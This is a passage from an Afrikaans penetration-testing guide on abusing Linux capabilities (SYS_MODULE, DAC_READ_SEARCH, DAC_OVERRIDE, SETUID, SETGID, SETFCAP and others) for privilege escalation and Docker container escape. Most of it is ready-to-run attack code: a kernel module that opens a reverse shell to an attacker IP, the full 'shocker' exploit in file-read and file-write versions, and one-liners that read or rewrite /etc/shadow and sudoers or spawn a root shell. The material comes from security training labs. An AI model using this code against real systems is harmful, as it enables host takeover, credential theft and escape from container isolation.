Dit beteken dat dit moontlik is om die opdrag **`insmod`** te gebruik om ’n kernel module in te voeg. Volg die voorbeeld hieronder om ’n **reverse shell** te verkry deur hierdie voorreg te misbruik.

**Voorbeeld met omgewing (Docker breakout)**

Jy kan die geaktiveerde capabilities binne die Docker-container nagaan deur die volgende te gebruik:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Binne die vorige uitvoer kan jy sien dat die **SYS_MODULE**-capability geaktiveer is.<sup>[[14]](#references)</sup>

**Skep** die **kernel module** wat ’n reverse shell gaan uitvoer en die **Makefile** om dit te **compile**:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Die leë karakter voor elke make-woord in die Makefile **moet ’n tab wees, nie spasies nie**!

Voer `make` uit om dit te compileer.
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Uiteindelik, begin `nc` binne ’n shell en **laai die module** vanuit ’n ander een, en jy sal die shell in die nc-proses vasvang:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Die kode van hierdie tegniek is gekopieer uit die laboratorium van "Abusing SYS_MODULE Capability" van** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

Nog ’n voorbeeld van hierdie tegniek kan gevind word by [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) stel ’n proses in staat om **toestemmings vir die lees van lêers en vir die lees en uitvoer van gidse te omseil**. Die primêre gebruik daarvan is vir lêersoek- of leesdoeleindes. Dit laat ’n proses egter ook toe om die `open_by_handle_at(2)`-funksie te gebruik, wat toegang tot enige lêer kan verkry, insluitend lêers buite die proses se mount namespace. Die handle wat in `open_by_handle_at(2)` gebruik word, is veronderstel om ’n nie-deursigtige identifiseerder te wees wat deur `name_to_handle_at(2)` verkry is, maar dit kan sensitiewe inligting bevat, soos inode-nommers, wat vatbaar is vir manipulasie. Die potensiaal vir uitbuiting van hierdie capability, veral in die konteks van Docker-containers, is deur Sebastian Krahmer met die shocker exploit gedemonstreer, soos [hier](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) ontleed word.<sup>[[12]](#references)[[13]](#references)</sup>
**Dit beteken dat jy lêerlees-toestemmingkontroles en gidslees-/uitvoertoestemmingkontroles kan omseil**.<sup>[[14]](#references)</sup>

**Voorbeeld met binary**

Die binary kan lêers lees wat in sy namespaces toeganklik is. Dus, indien ’n lêer soos `tar` hierdie capability het, kan dit die shadow file lees:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Voorbeeld met binary2**

In hierdie geval, kom ons veronderstel dat die **`python`** binary hierdie vermoë het. Om root-lêers te lys, kan jy die volgende doen:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
En om 'n lêer te lees, kon jy doen:
```python
print(open("/etc/shadow", "r").read())
```
**Voorbeeld in die Environment (Docker breakout)**

Jy kan die geaktiveerde capabilities binne die Docker-container nagaan deur `capsh --print` te gebruik.<sup>[[14]](#references)[[26]](#references)</sup>
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Binne die vorige uitvoer kan jy sien dat die **DAC_READ_SEARCH**-capability geaktiveer is. Dit omseil DAC-lees-/soektjeks en laat `open_by_handle_at(2)` toe; dit is nie op sigself ’n process-debugging-capability nie.<sup>[[14]](#references)</sup>

Jy kan leer hoe die volgende exploit werk by [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), maar kortliks: **CAP_DAC_READ_SEARCH** laat deur die file system beweeg sonder permission checks en laat `open_by_handle_at(2)` toe; dit kan files blootstel wat deur ander processes oopgemaak is wanneer die relevante namespaces en mounts bereikbaar is.<sup>[[13]](#references)[[14]](#references)</sup>

Die oorspronklike exploit wat hierdie permissions misbruik om files vanaf die host te lees, kan hier gevind word: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c); die volgende is ’n **modified version waarmee jy die file wat gelees moet word as die eerste argument kan deurgee en die resultaat na ’n file kan dump**.<sup>[[12]](#references)</sup>
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> Die exploit moet 'n pointer vind na iets wat op die host gemount is. Die oorspronklike exploit het die lêer /.dockerinit gebruik, en hierdie gewysigde weergawe gebruik /etc/hostname. As die exploit nie werk nie, moet jy dalk 'n ander lêer stel. Om 'n lêer te vind wat op die host gemount is, voer eenvoudig die mount command uit:

![CAP SYS MODULE - CAP DAC READ SEARCH: Die exploit moet 'n pointer vind na iets wat op die host gemount is. Die oorspronklike exploit het die lêer /.dockerinit gebruik, en hierdie gewysigde weergawe gebruik...](<../../images/image (407) (1).png>)

**Die code van hierdie technique is gekopieer uit die laboratorium van "Abusing DAC_READ_SEARCH Capability" van** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**Hierdie capability omseil file read-, write- en execute permission checks**.<sup>[[14]](#references)</sup>

Soek na lêers wat leesbaar of skryfbaar word deur lidmaatskap van 'n bevoorregte groep; die nuttige teikens hang af van die target se ownership en mode bits.<sup>[[14]](#references)</sup>

**Voorbeeld met binary**

In hierdie voorbeeld het vim hierdie capability, sodat jy enige lêer soos _passwd_, _sudoers_ of _shadow_ kan wysig:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Voorbeeld met binary 2**

In hierdie voorbeeld sal **`python`** binary hierdie capability hê. Jy kan python gebruik om enige lêer te override:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Voorbeeld met omgewing + CAP_DAC_READ_SEARCH (Docker breakout)**

Bevestig `CAP_DAC_OVERRIDE` met `capsh --print` soos in die voorafgaande `CAP_DAC_READ_SEARCH`-omgewingsvoorbeeld getoon word.<sup>[[14]](#references)[[26]](#references)</sup>

Lees eerstens die vorige afdeling wat [**DAC_READ_SEARCH capability misbruik om willekeurige lêers te lees**](linux-capabilities.md#cap_dac_read_search) van die host en **compile** die exploit.\
Compile dan **die volgende weergawe van die shocker exploit** wat jou sal toelaat om **willekeurige lêers** binne die host se lêerstelsel **te skryf**:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Om uit die Docker-container te **escape**, kon jy die lêers `/etc/shadow` en `/etc/passwd` van die host **download**, ’n **new user** daarby **add**, en **`shocker_write`** gebruik om hulle te oorskryf. Daarna kon jy via **ssh** **access** verkry.

**Die code van hierdie technique is gekopieer uit die laboratorium "Abusing DAC_OVERRIDE Capability" van** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

## CAP_CHOWN

**Hierdie capability laat ’n process toe om die eienaarskap van files te verander**.<sup>[[14]](#references)</sup>

**Voorbeeld met binary**

Kom ons veronderstel die **`python`** binary het hierdie capability; jy kan die eienaar van ’n file soos **`shadow`** verander en dan die gevolglike access gebruik om dit te wysig indien ander permissions dit toelaat:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Of met die **`ruby`**-binary wat hierdie capability het:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**Hierdie capability omseil eienaarskapkontroles vir baie lêerbewerkings, insluitend die verandering van permissions**.<sup>[[14]](#references)</sup>

**Voorbeeld met binary**

As python hierdie capability het, kan jy die permissions van die shadow-lêer wysig, **die root-wagwoord verander**, en privileges eskaleer:
```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```
### CAP_SETUID

**Hierdie vermoë laat ’n proses toe om sy effektiewe gebruiker-ID te verander, onderhewig aan die geloofsbrief- en vermoëreëls wat deur die kernel afgedwing word**.<sup>[[14]](#references)</sup>

**Voorbeeld met binary**

As python hierdie **vermoë** het, kan jy dit baie maklik misbruik om privileges na root te eskaleer:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Nog ’n manier:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**Hierdie capability laat 'n proses toe om sy effektiewe groep-ID te verander, onderhewig aan die credential- en capability-reëls wat deur die kernel afgedwing word**.<sup>[[14]](#references)</sup>

Daar is baie lêers wat jy kan **oorwrite om privileges te eskaleer,** [**jy kan hier idees kry**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Voorbeeld met binary**

In hierdie geval moet jy soek na interessante lêers wat 'n groep kan lees, omdat jy enige groep kan impersonate:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Sodra jy 'n lêer gevind het wat jy kan misbruik (deur dit te lees of te skryf) om privileges te eskaleer, kan jy **'n shell kry wat die interessante group naboots** met:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
In hierdie geval is die groep shadow nageboots, sodat jy die lêer `/etc/shadow` kan lees:
```bash
cat /etc/shadow
```
### Gekombineerde ketting: CAP_SETGID + CAP_CHOWN

Wanneer albei capabilities in dieselfde helper beskikbaar is, is ’n praktiese ketting:

1. Verander EGID na `shadow` (of ’n ander bevoorregte groep).
2. Gebruik `chown` op `/etc/shadow` om jou UID te stel terwyl die groep `shadow` behou word.
3. Lees ’n teiken-hash en crack/pivot.
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
Dit vermy die behoefte aan volledige root direk en is gewoonlik voldoende om deur credential reuse te pivot.

As **docker** geïnstalleer is, kan jy die **docker group** **impersonate** en dit misbruik om met die [**docker socket** te kommunikeer en privileges te eskaleer](#writable-docker-socket).

## CAP_SETFCAP

**Hierdie vermoë laat ’n proses toe om file capabilities te stel**.<sup>[[14]](#references)</sup>

**Voorbeeld met binary**

As python hierdie **vermoë** het, kan jy dit baie maklik misbruik om privileges na root te eskaleer:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> ’n Nuutgeskrewe file capability set vervang die vorige set; as die helper daarna met slegs die nuwe capabilities uitgevoer word, behou dit moontlik nie meer `CAP_SETFCAP` om ’n ander file op te dateer nie.<sup>[[14]](#references)[[25]](#references)</sup>

Sodra jy [SETUID capability](linux-capabilities.md#cap_setuid) het, kan jy na die afdeling daarvan gaan om te sien hoe om voorregte te eskaleer.

**Voorbeeld met environment (Docker breakout)**

Docker se gedokumenteerde verstek capability set sluit **CAP_SETFCAP** in, maar die werklike set hang van die runtime-konfigurasie af.<sup>[[19]](#references)</sup>
Jy kan die proses se capabilities inspekteer met:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Hierdie capability laat toe dat file capabilities geskryf word, maar verleen nie op sigself daardie capabilities aan die huidige proses nie en omseil ook nie die file-, bounding-set- en namespace-reëls wat toegepas word wanneer die file uitgevoer word nie.<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
Die lêer se toegelate capabilities word beperk deur die proses se capability bounding set, en die lêer se effective bit bepaal of die lêer se permitted set in die proses se effective set verhoog word. Daarom maak die byvoeging van capabilities tot ’n lêer nie outomaties elke aangevraagde capability tydens uitvoering bruikbaar nie.<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) verskaf ’n aantal sensitiewe bewerkings, insluitend toegang tot `/dev/mem`, `/dev/kmem` of `/proc/kcore`, die wysiging van `mmap_min_addr`, toegang tot die `ioperm(2)`- en `iopl(2)`-system calls, en verskeie skyfopdragte. Die `FIBMAP ioctl(2)` word ook deur hierdie capability geaktiveer, wat in die [past](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) probleme veroorsaak het. Volgens die man page laat dit die houer ook toe om ’n reeks toestelspesifieke bewerkings op ander toestelle uit te voer.<sup>[[14]](#references)</sup>

Dit kan nuttig wees vir **privilege escalation** en **Docker breakout**.<sup>[[14]](#references)</sup>

## CAP_KILL

**Hierdie capability omseil permission checks vir die stuur van seine na prosesse in die gevalle wat deur die kernel gedefinieer word**.<sup>[[14]](#references)</sup>

**Voorbeeld met binary**

Kom ons veronderstel die **`python`** binary het hierdie capability. As jy ook ’n **service- of socket-konfigurasie** (of enige konfigurasielêer wat met ’n service verband hou) kon wysig, kon jy dit backdoor, en dan die proses wat met daardie service verband hou kill en wag totdat die nuwe konfigurasielêer met jou backdoor uitgevoer word.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc with kill**

If you have kill capabilities and there is a **node program running as root** (or as a different user)kan jy dit waarskynlik die **signal SIGUSR1** **stuur** en dit die **node debugger** laat **open**, waaraan jy kan koppel.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Hierdie capability laat toe dat daar aan Internet-poorte onder 1024 gebind word.** Dit verleen nie direk breër privilege escalation nie.<sup>[[14]](#references)</sup>

**Voorbeeld met binary**

As **`python`** hierdie capability het, sal dit op enige poort kan listen en selfs van daar af aan enige ander poort kan connect (sommige dienste vereis connections vanaf poorte met spesifieke privileges)

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) laat prosesse toe om **RAW- en PACKET-sockets te skep**, sodat hulle arbitrêre netwerkpakkette kan genereer en stuur. Dit kan tot sekuriteitsrisiko's in containerized omgewings lei, soos packet spoofing, traffic injection en die omseiling van network access controls. Malicious actors kan dit uitbuit om met container routing in te meng of host network security te kompromitteer, veral sonder voldoende firewall-beskerming. Daarbenewens ondersteun **CAP_NET_RAW** bewerkings soos ping deur RAW ICMP requests.<sup>[[14]](#references)</sup>

**Dit kan packet capture met 'n geskikte socket interface moontlik maak.** Dit verleen nie direk breër privilege escalation nie.<sup>[[14]](#references)</sup>

**Voorbeeld met binary**

As die binary **`tcpdump`** hierdie capability het, sal jy dit kan gebruik om network information vas te lê.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
As die **omgewing** hierdie capability toestaan, kan **`tcpdump`** dit ook gebruik om verkeer af te luister.<sup>[[14]](#references)</sup>

**Example with binary 2**

Die volgende voorbeeld is **`python2`**-code wat nuttig kan wees om verkeer van die "**lo**" (**localhost**)-interface te onderskep. Die code is afkomstig van die lab "_The Basics: CAP-NET_BIND + NET_RAW_" by [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).<sup>[[1]](#references)</sup>
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) gee die houer die vermoë om **netwerkkonfigurasies te verander**, insluitend firewall-instellings, routing tables, socket permissions en network interface-instellings binne die blootgestelde network namespaces. Dit maak dit ook moontlik om **promiscuous mode** op network interfaces te aktiveer, wat packet sniffing oor namespaces heen toelaat.<sup>[[14]](#references)</sup>

**Voorbeeld met binary**

Kom ons veronderstel dat die **python binary** hierdie capabilities het.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**Hierdie capability laat toe dat inode flags soos immutable en append-only gewysig word.** Dit verleen nie direk breër privilege escalation nie.<sup>[[14]](#references)</sup>

**Voorbeeld met binary**

As jy vind dat ’n lêer immutable is en Python hierdie capability het, kan jy **die immutable attribute verwyder en die lêer wysigbaar maak:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
f.write('New content for the file\n')
```
